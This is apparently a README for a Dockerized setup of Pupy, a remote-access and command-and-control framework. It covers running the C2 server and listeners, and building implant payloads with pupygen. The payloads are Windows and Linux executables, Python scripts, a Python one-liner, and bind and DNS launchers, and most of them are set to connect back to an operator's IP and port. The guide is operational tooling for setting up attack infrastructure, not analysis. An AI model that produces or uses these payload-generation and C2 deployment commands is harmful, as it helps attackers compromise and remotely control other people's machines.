# Pupy C2 Docker Setup Guide

Pupy is no longer mainted and a lot of the requirements are outdated. This is a dockerized version of Pupy using the nextgen branch. It has pinned requirements and python3.10.

This enhanced Docker setup provides a flexible way to run both the Pupy server (pupysh) and payload generator (pupygen).

## Directory Structure

After running the setup, you'll have:

```bash
pupy-docker/
├── Dockerfile               # Enhanced Dockerfile
├── docker-entrypoint.sh     # Entrypoint script
├── docker-compose.yml       # Docker Compose configuration
├── pinned-requirements.txt  # Python dependencies
├── .env.example             # Environment variables example for Docker
├── config/                  # Configuration files (auto-created)
│   └── pupy.conf.example    # Example Pupy configuration rename to pupy.conf to use
├── output/                  # Generated payloads (auto-created)
└── data/                    # Persistent data (auto-created)
```

## Quick Start

1. **Start the Pupy server with pre-built image:**

   ```bash
   docker-compose up -d pupy-server
   ```

   The default configuration uses a pre-built image from Docker Hub (`followthewhit3rabbit/pupy-server:py10`).

2. **View logs:**

   ```bash
   docker-compose logs -f pupy-server
   ```

3. **For development or to build locally:**

   ```bash
   # Build and run the development version
   docker-compose --profile dev up -d pupy-server-dev
   ```

## Configuration

### Using Custom Configuration

1. On first run, the default configuration is copied to `./config/pupy.conf`
2. You can copy ./config/pupy.conf.example to ./config/pupy.conf to use it
3. Edit `./config/pupy.conf` to customize your setup
4. Restart the container to apply changes:

   ```bash
   docker-compose restart pupy-server
   ```

### Key Configuration Options

Edit `./config/pupy.conf` to modify:

- **Listeners**: Change ports and transports in `[listeners]` section
- **Transport settings**: Configure SSL, HTTP, etc. in respective sections
- **Paths**: Modify data storage locations in `[paths]` section
- **Credentials**: Will be auto-generated on first run

## Running Commands

### Pupy Server (pupysh)

**Interactive mode:**

```bash
docker-compose run --rm pupy-server pupysh
```

**With custom listeners:**

```bash
docker-compose run --rm pupy-server pupysh -l ssl 0.0.0.0:443
```

**Multiple listeners:**

```bash
docker-compose run --rm pupy-server pupysh -l ssl 443 -l http 80
```

### Payload Generator (pupygen)

**Generate Windows payload with connect launcher:**

```bash
docker-compose run --rm pupy-generator pupygen -O windows -A x64 -o ./payload.exe connect -c <host:port> -t ssl
```

**Generate Linux payload with connect launcher:**

```bash
docker-compose run --rm pupy-generator pupygen -O linux -A x64 -o ./payload.lin connect -c <host:port> -t ssl
```

**Generate Python payload with connect launcher:**

```bash
docker-compose run --rm pupy-generator pupygen -f py -o ./payload.py connect -c <host:port> -t ssl
```

**Replace** `<host:port>` **with your actual server IP and port, for example:**

```bash
docker-compose run --rm pupy-generator pupygen -O linux -A x64 -o ./payload.lin connect -c 192.168.1.100:443 -t ssl
```

**List available options:**

```bash
docker-compose run --rm pupy-generator pupygen -l
```

### Understanding the Module Structure

Pupy uses Python's module system:

- `python -m pupy.cli` runs pupysh (via **main**.py)
- `python -m pupy.cli.pupygen` runs pupygen module
- Both commands properly set up the Python path and imports

## Using Profiles

### Generator Profile

You can use the generator profile to run payload generation:

```bash
docker-compose --profile generator run pupy-generator pupygen -O windows -A x64
```

### Development Profile

The docker-compose.yml includes a development profile for users who want to build the image locally instead of using the pre-built version from Docker Hub:

```bash
# Build and start the development server
docker-compose --profile dev up -d pupy-server-dev

# Build and run the generator in development mode
docker-compose --profile dev --profile generator run pupy-generator-dev pupygen -O windows -A x64
```

### Deployment Options

#### Using Pre-built Images (Recommended)

By default, the docker-compose.yml uses the pre-built image `followthewhit3rabbit/pupy-server:py10` from Docker Hub. This is the recommended approach for most users as it:

- Eliminates build-time errors and dependencies
- Ensures consistent environments across deployments
- Significantly reduces setup time

#### Building Locally

For developers who need to customize the image or contribute to the project:

1. Use the development profile as described above
2. Make your changes to the Dockerfile or configuration files
3. Test thoroughly before deployment

To build and push a new version to Docker Hub (maintainers only):

```bash
# Build with no cache
docker-compose build --no-cache

# Tag the image
docker tag pupy-server:py10 followthewhit3rabbit/pupy-server:py10

# Push to Docker Hub
docker push followthewhit3rabbit/pupy-server:py10
```

### Offline Deployment

For air-gapped environments or situations where internet access is restricted, you can save the Docker image locally and transfer it to the target system.

#### On a system with internet access

1. Pull the image:

   ```bash
   docker pull followthewhit3rabbit/pupy-server:py10
   ```

2. Save the image to a file:

   ```bash
   docker save -o pupy-server-py10.tar followthewhit3rabbit/pupy-server:py10
   ```

3. Transfer the `pupy-server-py10.tar` file to the offline system using physical media (USB drive, etc.)

#### On the offline system

1. Load the image from the file:

   ```bash
   docker load -i pupy-server-py10.tar
   ```

2. Verify the image is available:

   ```bash
   docker images
   ```

3. Create a docker-compose.yml file on the offline system with the configuration from this repository

4. Run the container:

   ```bash
   docker-compose up -d pupy-server
   ```

#### Additional Considerations for Offline Use

- Ensure all necessary configuration files and dependencies are included with your transfer
- For a completely portable solution, consider creating a directory structure like this:

  ```text
  pupy-offline/
  ├── pupy-server-py10.tar     # Docker image file
  ├── docker-compose.yml       # Configuration file
  ├── config/                  # Configuration directory
  │   └── pupy.conf            # Custom configuration
  ├── data/                    # For persistent data
  └── output/                  # For generated payloads
  ```

- Include a simple setup script:

  ```bash
  #!/bin/bash
  # Load the Docker image
  docker load -i pupy-server-py10.tar
  
  # Start the container
  docker-compose up -d
  
  echo "Pupy server ready at https://localhost"
  ```

## Port Mappings

Default port mappings in docker-compose.yml:

- **443**: SSL/TLS (default)
- **8443**: Alternative SSL
- **80**: HTTP
- **8080, 8081**: Alternative HTTP
- **9090**: Obfs3 transport
- **9091**: RSA transport
- **123/udp**: UDP transport
- **1234**: TCP cleartext/EC4
- **1235**: ECM transport
- **9000**: Web server for payloads

## Environment Variables

Create a `.env` file from `.env.example`:

```bash
cp .env.example .env
```

Available variables:

- `EXTERNAL_IP`: Set your external IP for payload callbacks
- `PUPY_TRANSPORT`: Default transport (ssl, http, etc.)

## Persistent Data

All data is stored in mounted volumes:

- `./config/`: Configuration files
- `./output/`: Generated payloads
- `./data/`: Runtime data (logs, downloads, etc.)

## Examples

### Basic Server Setup

```bash
# Start server with default SSL listener on port 443
docker-compose up -d pupy-server

# Check status
docker-compose ps

# View logs
docker-compose logs -f pupy-server
```

### Generate Payloads

```bash
# Windows 64-bit executable with connect launcher
docker-compose run --rm pupy-generator pupygen -O windows -A x64 -o ./win64.exe connect -c YOUR_IP:443 -t ssl

# Linux 64-bit with connect launcher and ssl transport
docker-compose run --rm pupy-generator pupygen -O linux -A x64 -o ./linux64 connect -c YOUR_IP:443 -t ssl

# Python oneliner with connect launcher
docker-compose run --rm pupy-generator pupygen -f py_oneliner connect -c YOUR_IP:443 -t ssl

# Using bind launcher (reverse connection)
docker-compose run --rm pupy-generator pupygen -O windows -A x64 -o ./win64_bind.exe bind -p 8443 -t ssl

# Using dnscnc launcher (DNS Command & Control)
docker-compose run --rm pupy-generator pupygen -O linux -A x64 -o ./output/linux64_dns dnscnc --domain yourdomain.com
```

### Interactive Shell

```bash
# Get a bash shell in the container
docker-compose run --rm pupy-server bash

# Run pupysh interactively
docker-compose run --rm -it pupy-server pupysh
```

## Troubleshooting

### Permission Issues

If you encounter permission issues with mounted volumes:

```bash
# Fix ownership
sudo chown -R 1000:1000 ./config ./output ./data
```

### Port Conflicts

If ports are already in use, modify the port mappings in `docker-compose.yml`:

```yaml
ports:
  - "4433:443"  # Map to different external port
```

### Container Won't Start

Check logs for errors:

```bash
docker-compose logs pupy-server
```

## Security Notes

1. **Change default credentials**: On first run, new SSL certificates are generated
2. **Firewall**: Only expose necessary ports
3. **Configuration**: Review and harden `pupy.conf` settings
4. **Updates**: Regularly rebuild the image to get security updates

## Advanced Usage

### Custom Dockerfile Build Args

```bash
docker-compose build --build-arg PUPY_UID=2000 --build-arg PUPY_GID=2000
```

### Running with Specific Config

```bash
docker run -it --rm \
  -v $(pwd)/custom-config:/opt/pupy/config \
  -v $(pwd)/output:/opt/pupy/output \
  -p 443:443 \
  pupy-server:py38-enhanced pupysh
```
